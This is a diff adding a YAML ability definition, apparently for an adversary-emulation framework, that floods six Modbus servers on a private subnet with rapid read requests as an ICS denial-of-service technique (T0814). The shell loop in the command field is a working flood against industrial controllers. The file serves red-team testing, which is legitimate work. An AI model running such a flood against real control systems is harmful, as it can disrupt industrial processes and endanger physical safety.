@@ -1,0 +1,24 @@
+---
+
+- id: f6a7b8c9-6666-6666-6666-000000000004
+  name: Modbus - Denial of Service Flood
+  description: |
+    Flood all Modbus servers with rapid read requests.
+    Uses background processes instead of shell functions.
+  tactic: inhibit-response-function
+  technique_id: T0814
+  technique_name: Denial of Service
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      for j in 10 11 12 13 14 15; do
+        for i in $(seq 1 200); do
+          ./modbus_cli 192.168.95.$j --port 502 read_ir 1 2 2>/dev/null;
+        done &
+      done &&
+      wait &&
+      echo "DOS_FLOOD_COMPLETE"
+    payloads:
+    - modbus_cli
+    timeout: 120
